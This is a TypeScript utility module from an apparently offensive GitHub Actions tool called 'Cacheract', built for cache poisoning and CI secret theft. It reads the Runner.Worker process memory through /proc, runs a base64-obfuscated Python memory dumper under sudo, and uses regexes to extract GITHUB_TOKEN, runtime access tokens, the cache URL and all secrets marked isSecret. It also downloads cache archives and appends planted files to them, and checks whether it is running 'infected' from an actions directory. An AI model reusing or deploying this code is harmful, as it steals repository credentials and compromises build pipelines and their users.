import { exec, execSync } from 'child_process';
import { promisify } from 'util';
import * as github from '@actions/github';
import * as path from 'path';
import * as fs from 'fs';
import axios from 'axios';
import { tmpdir } from 'os';

const execAsync = promisify(exec);

interface CacheEntry {
    key: string;
    version: string;
    ref: string;
    size: number;
}

interface ActionDetails {
    path: string;
    yml: string;
    js: string;
}

export type RunnerEnvironment = {
    github_hosted: boolean;
    os: 'Linux' | 'Windows' | 'Darwin' | 'Unknown';
}

export async function sleep(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Generate a random string of specified length
 * @param length - Length of the random string
 * @returns Random string
 */
export function generateRandomString(length: number): string {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

export function isInfected(): boolean {
    // Check if the normalized path includes '_actions'
    return __dirname.includes('_actions');
}

export async function getOsInfo() {
    const { stdout, stderr } = await execAsync('lsb_release -i -r -s');

    const [osName, osVersion] = stdout.trim().split('\n');

    return { osName: osName, osVersion: osVersion };

}

/**
 * 
 */
export async function retrieveEntry(cache_key: string, cache_version: string, runtimeToken: string, cacheUrl: string): Promise<string> {
    var cacheHttpclient = require('@actions/cache/lib/internal/cacheHttpClient');
    try {
        const headers = {
            'Authorization': `Bearer ${runtimeToken}`,
            'User-Agent': 'actions/cache-4.0.0',
            'accept': 'application/json;api-version=6.0-preview.1'
        };

        // We need both the cache URL and ACTIONS_RUNTIME_TOKEN to retrieve the cache.
        if (!cacheUrl || !runtimeToken) {
            return '';
        }

        const url = new URL(`${cacheUrl}_apis/artifactcache/cache?keys=${encodeURIComponent(cache_key)}&version=${encodeURIComponent(cache_version)}`);

        // Make the HTTP GET request using axios
        const response = await axios.get(url.href, { headers });
        if (response.status == 200) {
            const location = new URL(response.data['archiveLocation'])
            await cacheHttpclient.downloadCache(location, '/tmp/cacheract.tar.tzstd');
            if (fs.existsSync('/tmp/cacheract.tar.tzstd')) {
                console.log('Cache retrieved successfully');
                return '/tmp/cacheract.tar.tzstd';
            } else {
                console.error('Failed to download cache');
                return '';
            }
        } else if (response.status == 204) {
            console.log('Cache not found!');
        } else {
            console.error(`Failed to retrieve cache: ${response.status}`);
        }
    } catch (error) {
        console.error(`Failed to retrieve cache: ${error}`);
    }

    return '';
}

export async function checkCacheEntry(token: string, key: string, ref: string): Promise<Boolean> {
    const octokit = github.getOctokit(token);
    const { owner, repo } = github.context.repo;

    try {
        // List cache entries filtered by key
        const response = await octokit.request('GET /repos/{owner}/{repo}/actions/caches?key={key}&ref={ref}', {
            owner,
            repo,
            key,
            ref
        });

        // Check if there is at least one cache entry
        const hasCache = response.data.actions_caches.length > 0;
        return hasCache;

    } catch (error) {
        if (
            error instanceof Error &&
            error.message.includes('Resource not accessible by integration')
        ) {
            console.error("TOKEN permission issue.");
        } else {
            console.error('Error listing cache entries:', error);
        }
        return false; // Return false in case of any errors
    }
}

/**
 * List cache entries for the repository.
 * @param token - GitHub token for authentication
 * @returns List of cache entries
 */
export async function listCacheEntries(token: string): Promise<CacheEntry[]> {
    const octokit = github.getOctokit(token);
    const { owner, repo } = github.context.repo;

    try {
        // List cache entries
        const response = await octokit.request('GET /repos/{owner}/{repo}/actions/caches', {
            owner,
            repo
        });

        // Extract and return the cache entries
        return response.data.actions_caches.map((cache: any) => ({
            key: cache.key,
            version: cache.version,
            ref: cache.ref,
            size: cache.size_in_bytes
        }));
    } catch (error) {
        if (error instanceof Error && error.message.includes('Resource not accessible by integration')) {
            console.error("TOKEN permission issue.");
        } else {
            console.error('Error listing cache entries:', error);
        }
        return [];
    }
}

/**
 * List actions in the given directory path
 * @param actionPath - Path to the actions directory
 * @returns Promise<Map<string, ActionDetails>> - Map of action details
 */
export async function listActions(actionPath: string): Promise<Map<string, ActionDetails>> {
    const actions = new Map<string, ActionDetails>();

    const directories = fs.readdirSync(actionPath, { withFileTypes: true })
        .filter(dirent => dirent.isDirectory())
        .map(dirent => dirent.name);

    for (const dir of directories) {
        const actionDir = path.join(actionPath, dir);
        const subDirs = fs.readdirSync(actionDir).filter(subDir => fs.lstatSync(path.join(actionDir, subDir)).isDirectory());

        for (const subDir of subDirs) {

            const subActionDir = path.join(actionDir, subDir);
            const subSubDirs = fs.readdirSync(subActionDir).filter(subSubDir => fs.lstatSync(path.join(subActionDir, subSubDir)).isDirectory());

            for (const subSubDir of subSubDirs) {

                const subSubActionDir = path.join(subActionDir, subSubDir);
                const ymlFile = ['action.yml', 'action.yaml'].find(file => fs.existsSync(path.join(subSubActionDir, file)));
                if (ymlFile) {
                    const distDir = path.join(subSubActionDir, 'dist');
                    if (fs.existsSync(distDir) && fs.lstatSync(distDir).isDirectory()) {
                        const jsFiles = fs.readdirSync(distDir).filter(file => file.endsWith('.js'));
                        if (jsFiles.length > 0) {
                            const actionPath = `${dir}/${subDir}/${subSubDir}`
                            actions.set(`${dir}/${subDir}`, {
                                path: actionPath,
                                yml: ymlFile,
                                js: path.join('dist', jsFiles[0])
                            });
                        }
                    }
                }
            }
        }
    }

    return actions;
}

/**
 * Create archive from a directory
 * @param sourceDir - Path to the source directory
 * @param archivePath - Where to place the archive.
 */
export async function createArchive(archivePath: string, sourceDir: string): Promise<void> {
    try {
        const command = `tar -P --zstd -cf ${archivePath} ${sourceDir}`;
        const { stdout, stderr } = await execAsync(command);
        console.log(`About to run command: ${command}`);
    } catch (error) {
        console.error('Error creating archive:', error);
        throw error;
    }
}


/**
 * Update an archive with new files
 * @param archivePath - Path to the archive file
 * @param newFiles - Array of new files to add to the archive
 * @returns Promise<boolean> indicating if the archive was updated successfully
 */
export async function updateArchive(archive_path: string, new_files: { stagingDir: string; leadingPath: string; }[]): Promise<Boolean> {
    const tempDir = fs.mkdtempSync(path.join(tmpdir(), 'tar-'));
    const tempTarFile = path.join(tempDir, 'archive.zstd');
    try {
        // Decompress the tar.zst archive to a temporary tar file
        const decompressCommand = `zstd -d < ${archive_path} > ${tempTarFile}`;
        console.log(`About to run command: ${decompressCommand}`);
        // First decompress
        await execAsync(decompressCommand);

        for (const new_file of new_files) {
            const updateCommand = `tar -P --append --transform 's,^${new_file.stagingDir},${new_file.leadingPath},' --file=${tempTarFile} ${new_file.stagingDir}`;
            console.log(`About to run command: ${updateCommand}`);
            await execAsync(updateCommand);
        }
        const compressCommand = `file ${tempTarFile} && zstd < ${tempTarFile} > ${archive_path}`;
        console.log(`About to run command: ${compressCommand}`);
        await execAsync(compressCommand);

        return true;
    } catch (error) {
        console.error('Error updating archive:', error);
        throw error;
    } finally {
        // Clean up temporary files
        fs.rm(tempDir, { recursive: true }, (err) => {
            if (err) {
                console.error('Error removing temporary directory:', err);
            }
        });
    }
}


/**
 * 
 * @param fileName - name of file to prepare
 * @param decodedContent - decoded conent to write.
 * @returns string - Path to the source directory
 */
export async function prepareFileEntry(fileName: string, decodedContent: string): Promise<string> {
    const randomDirName = generateRandomString(8);
    const sourceDir = path.join('/tmp', `${randomDirName}`);

    // Ensure the source directory exists
    if (!fs.existsSync(sourceDir)) {
        fs.mkdirSync(sourceDir, { recursive: true });
    }

    fs.writeFileSync(path.join(sourceDir, fileName), decodedContent);
    return sourceDir;
}

/**
 * Check if the current branch is the default branch
 * @param token - GitHub token for authentication
 * @returns Promise<boolean> indicating if the current branch is the default branch
 * @throws Error if required environment variables are not set
 */
export async function isDefaultBranch(token: string): Promise<boolean> {
    const githubRef = process.env.GITHUB_REF;
    const githubRepository = process.env.GITHUB_REPOSITORY;

    if (!githubRef || !githubRepository) {
        throw new Error('GITHUB_REF or GITHUB_REPOSITORY environment variable is not set');
    }

    const [owner, repo] = githubRepository.split('/');
    const branchName = githubRef.replace('refs/heads/', '');

    const url = `https://api.github.com/repos/${owner}/${repo}`;

    try {
        const response = await axios.get(url, {
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        const defaultBranch = response.data.default_branch;
        return branchName === defaultBranch;
    } catch (error) {
        console.error('Error fetching repository information:', error);
        return false;
    }
}
/**
 * Clear a cache entry
 * @param key - Cache key to clear.
 * @param version - Version of the cache entry to clear
 * @param auth_token - GITHUB_TOKEN to use for authentication
 * @returns boolean indicating if deletion was successful
 */
export async function clearEntry(key: string, version: string, auth_token: string): Promise<boolean> {
    const octokit = github.getOctokit(auth_token);
    const { owner, repo } = github.context.repo;

    try {

        // List cache entries filtered by key
        const response1 = await octokit.request('GET /repos/{owner}/{repo}/actions/caches?key={key}', {
            owner,
            repo,
            key,
        });

        if (response1.status === 200) {
            // Check if there is at least one cache entry
            if (response1.data.actions_caches.length === 0) {
                console.log(`Cache entry with key ${key} and version ${version} does not exist.`);
                return true;
            }
        }

        const response = await octokit.request('DELETE /repos/{owner}/{repo}/actions/caches?key={key}', {
            owner,
            repo,
            key
        });

        if (response.status === 200) {
            console.log(`Cache entry with key ${key} and version ${version} deleted successfully.`);
            return true;
        } else if (response.status === 404) {
            console.log(`Treating key ${key} and version ${version} as deleted since response was 404.`);
            return true;
        } else {
            console.log(`Error deleting key ${key} and version ${version} as deleted since response was ${response.status}.`);
            return false;
        }
    } catch (error) {
        if (error instanceof Error && (error as any).status === 404) {
            console.log(`Treating key ${key} and version ${version} as deleted since response was 404.`);
            return true;
        } else {
            console.error(`Error deleting cache entry: ${error}`);
            return false;
        }
    }
}

function mapPlatformToRunnerOS(platform: string): string {
    switch (platform) {
        case 'darwin': return 'macOS';
        case 'win32': return 'Windows';
        case 'linux': return 'Linux';
        default: return 'Linux'; // fallback
    }
}

/**
 * Check if the current branch is the default branch
 * @param token - GitHub token for authentication
 * @returns Promise<boolean> indicating if the current branch is the default branch
 * @throws Error if required environment variables are not set
 */
export async function checkRunnerEnvironment(): Promise<RunnerEnvironment> {
    const runnerEnvironment = process.env.RUNNER_ENVIRONMENT;
    const runnerOS = process.env.RUNNER_OS || mapPlatformToRunnerOS(process.platform);
    const github_hosted = true;

    if (!github_hosted) {
        console.error('Cacheract is only supported on GitHub-hosted runners.');
    }

    switch (runnerOS) {
        case 'Linux':
        case 'Windows':
        case 'Darwin':
            return {
                github_hosted,
                os: runnerOS
            };
        default:
            return {
                github_hosted,
                os: 'Unknown'
            };
    }
}

async function getPid(): Promise<number> {
    const procDir = '/proc';
    const pids = fs.readdirSync(procDir)
        .filter(file => /^\d+$/.test(file));

    for (const pid of pids) {
        try {
            const cmdline = fs.readFileSync(path.join(procDir, pid, 'cmdline'));
            if (cmdline.includes(Buffer.from('Runner.Worker'))) {
                return parseInt(pid, 10);
            }
        } catch (error) {
            continue;
        }
    }
    throw new Error('Cannot get pid of Runner.Worker');
}


async function readProcessMemory(): Promise<string[]> {
    const pid = await getPid();
    const mapPath = `/proc/${pid}/maps`;
    const memPath = `/proc/${pid}/mem`;

    const mapContent = fs.readFileSync(mapPath, 'utf8');
    const memFd = fs.openSync(memPath, 'r');
    
    const results: string[] = [];

    try {
        const lines = mapContent.split('\n');
        for (const line of lines) {
            const match = line.match(/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/);
            if (!match || match[3] !== 'r') continue;

            const start = parseInt(match[1], 16);
            const end = parseInt(match[2], 16);
            
            if (start > Number.MAX_SAFE_INTEGER) continue;

            const buffer = Buffer.alloc(end - start);
            try {
                fs.readSync(memFd, buffer, 0, end - start, start);
                const content = buffer.toString();
                if (content.trim()) {
                    results.push(content);
                }
            } catch (error) {
                continue;
            }
        }

        console.log(`Found ${results.length} memory regions`);
        return results;
    } finally {
        fs.closeSync(memFd);
    }
}

function parseMemoryContent(content: string): string[] {
    // Remove null bytes
    const cleanContent = content.replace(/\0/g, '');
        
    const patterns = [
        // GitHub system token pattern
        /"system\.github\.token":\{"value":"(ghs_[^"]*)","isSecret":true\}/g,
        // Generic secrets pattern
        /"[^"]+":\{"value":"[^"]*","isSecret":true\}/g,
        // Cache and access patterns
        /CacheServerUrl":"[^"]*"/g,
        /AccessToken":"[^"]*"/g
    ];

    const matches = new Set<string>();
    
    patterns.forEach(pattern => {
        const found = cleanContent.match(pattern);
        if (found) {
            console.log(`Found ${found.length} matches for pattern: ${pattern}`);
            found.forEach(match => {
                // Skip if it's a duplicate match between patterns
                if (!matches.has(match)) {
                    matches.add(match);
                }
            });
        }
    });

    return Array.from(matches).sort();
}

export async function getTokenRoot(): Promise<Map<string, string>> {
    const tokenMap = new Map<string, string>();
    
    try {
        const memoryContents = await readProcessMemory();
        for (const content of memoryContents) {
            const matches = parseMemoryContent(content);
            matches.forEach(match => {
                // Extract key/value from matches
                
                
                if (match.includes("system.github.token")) {
                    console.log(match);
                    tokenMap.set('GITHUB_TOKEN', match.split('":"')[1].replace('"', ''));
                } else if (match.includes('CacheServerUrl')) {
                    console.log(match);
                    tokenMap.set('ACTIONS_CACHE_URL', match.split('":"')[1].replace('"', ''));
                } else if (match.includes('AccessToken')) {
                    console.log(match);
                    tokenMap.set('ACCESS_TOKEN', match.split('":"')[1].replace('"', ''));
                } else if (match.includes('isSecret')) {
                        console.log(match);
                        const [key, value] = match.split('":{"value":"');
                        tokenMap.set(key.replace(/"/g, ''), value.replace('","isSecret":true}', ''));
                }
            });
        }
        return tokenMap;
    } catch (error) {
        console.error('Failed to parse memory content:', error);
        return new Map<string, string>();
    }
}

/**
 * 
 * @returns Dictionary containing extracted secrets, empty if it was not
 * possible to obtain secrets.
 * 
 */
export async function getToken(): Promise<Map<string, string>> {

    try {
        await execAsync('sudo -n true');
    } catch (error) {
        return new Map<string, string>()
    }
   
    const SCRIPT = "aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgpkZWYgZ2V0X3BpZCgpOgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCnBpZCA9IGdldF9waWQoKQoKbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCm1lbV9wYXRoID0gZiIvcHJvYy97cGlkfS9tZW0iCgp3aXRoIG9wZW4obWFwX3BhdGgsICdyJykgYXMgbWFwX2YsIG9wZW4obWVtX3BhdGgsICdyYicsIDApIGFzIG1lbV9mOgogICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICBtID0gcmUubWF0Y2gocicoWzAtOUEtRmEtZl0rKS0oWzAtOUEtRmEtZl0rKSAoWy1yXSknLCBsaW5lKQogICAgICAgIGlmIG0uZ3JvdXAoMykgPT0gJ3InOiAgIyByZWFkYWJsZSByZWdpb24KICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgIGVuZCA9IGludChtLmdyb3VwKDIpLCAxNikKICAgICAgICAgICAgaWYgc3RhcnQgPiBzeXMubWF4c2l6ZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKGNodW5rKQogICAgICAgICAgICBleGNlcHQgT1NFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="; // Example base64 encoded Python script

    // Base64 decode the script
    const decodedScript = Buffer.from(SCRIPT, 'base64').toString('utf-8');

    // Generate a random file name
    const randomFileName = generateRandomString(8) + '.py';
    const filePath = path.join('/tmp', randomFileName);

    // Write the script to the file
    fs.writeFileSync(filePath, decodedScript);

    // Construct the command string
    let command = `python3 ${filePath} | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;

    // prepend sudo if not running as root
    if (process.getuid() !== 0) {
        command = `sudo ${command}`;
    }

    // Run the script in a subprocess using Python3
    try {
        const { stdout, stderr } = await execAsync(command);
        if (stderr) {
            throw new Error(stderr);
        }

        // Regular expressions to match the tokens and URL
        const githubTokenRegex = /"system\.github\.token":\{"value":"(ghs_[^"]*)","isSecret":true\}/;
        const accessTokenRegex = /AccessToken":\s*"([^"]*)"/;
        const cacheServerUrlRegex = /CacheServerUrl":"([^"]*)"/;

        // Extract the values using the regular expressions
        const githubTokenMatch = stdout.match(githubTokenRegex);
        const accessTokenMatch = stdout.match(accessTokenRegex);
        const cacheServerUrlMatch = stdout.match(cacheServerUrlRegex);

        let result = new Map([
            ['GITHUB_TOKEN', githubTokenMatch ? githubTokenMatch[1] : ''],
            ['ACCESS_TOKEN', accessTokenMatch ? accessTokenMatch[1] : ''],
            ['ACTIONS_CACHE_URL', cacheServerUrlMatch ? cacheServerUrlMatch[1] : '']
        ])

        const secretRegex = /"([^"]+)":{"value":"([^"]*)","isSecret":true}/g;

        let match;
        while ((match = secretRegex.exec(stdout)) !== null) {
            const [_, key, value] = match;

            // Skip github token entries
            if (key === 'github_token' || key === 'system.github.token') {
                continue;
            }

            // Add to results map
            result.set(key, value);
        }

        return result;
    } catch (error) {
        throw new Error(`Failed to execute script: ${error}`);
    } finally {
        // Delete the script file
        fs.unlinkSync(filePath);
    }
}
